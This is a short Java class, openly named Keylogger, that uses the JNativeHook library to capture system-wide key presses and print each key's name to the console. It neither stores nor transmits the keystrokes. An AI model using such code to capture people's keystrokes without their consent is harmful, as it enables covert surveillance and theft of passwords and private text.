package com.mibef108287.app;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener{
  public Keylogger(){}

  @Override
  public void nativeKeyPressed(NativeKeyEvent nativeEvent){
    System.out.println(NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));
  }

  @Override
  public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
    
  }
}
